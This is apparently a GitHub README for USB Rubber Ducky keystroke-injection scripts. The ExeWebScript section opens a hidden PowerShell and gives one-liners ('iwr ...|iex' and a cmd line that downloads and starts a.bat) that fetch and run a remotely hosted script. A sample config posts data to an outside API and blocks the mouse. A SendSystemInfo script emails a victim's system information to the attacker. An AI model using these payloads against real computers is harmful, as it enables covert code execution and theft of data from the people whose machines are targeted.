<br>
<br>
<h1 align="center" style="border: none !important; padding-bottom: 1em !important;">🦆<br><br>Ducky Scripts</h1>  

<p align="center">
A few scripts for the USB rubber ducky from HAK5. The scripts are written in ducky script.
</p>

```
                                  _      _      _      USB       _      _      _
                               __(.)< __(.)> __(.)=   Rubber   >(.)__ <(.)__ =(.)__
                               \___)  \___)  \___)    Ducky!    (___/  (___/  (___/ 

```

## ExeWebScript
> **Note!** Your powershell Script file must be publicly hosted on the web and is by definition not secure. Be aware that you do not put sensitive or personal data inside the powershell script.  

This Rubber Ducky Script executes a custom powershell script that is hosted online. Host the `powershellScript.txt` or a custom script online and change the locatin in `ExeWebScript.duck` to that hosted script. 

### Ducky script
The `ExeWebScript.duck` opens the RUN box ([WINDOWS] + R), and opens a hidden powershell. `powershell -windowstyle hidden`. 
In powershell it uses IEX to execute plain text from wget. Examples:
```powershell
# shortest
  iwr www.yourSite.com/powershellScript.txt|iex

# alternative
  iex (wget www.yourSite.com/powershellScript.txt)
```
With the `AlternativeExeWebScript.duck` it first opens cmd instead of powershell and executes the next line of code:
```cmd
(powershell -Command "& {Invoke-WebRequest -Uri www.yourSite.com/powershellScript.txt -OutFile a.bat}") & start /min a.bat & exit
```

### Powershell script
The powershellScript.txt is just as an example of what some 'harmless' things that you could do.  
It comes with a config for some options.
```powershell   

    $MinimizeWindows = $True;
    $ShowPopUp = $False;

    $OpenWebPage = $True;
        $urlNAV = "www.yourWebsite.com/PageToDisplay";
        $OpenInFullScreen = $True;    
        
    $SendPostToAPI = $True;
        $urlAPI = "www.yourWebsite.com/PostAPI";
        
    $BlockMouse = $True;
        $BlockedTimeSeconds = 8;

    $SpeakText = $True;
        $TextToSpeak = "Hi. This is a Rubber Ducky";

```

## SendSystemInfo
> **Note!** Your password and emailadress wil be typed in plain text on the victim's computer  

This script sends the system information from a victim's computer to a specified e-mail address.
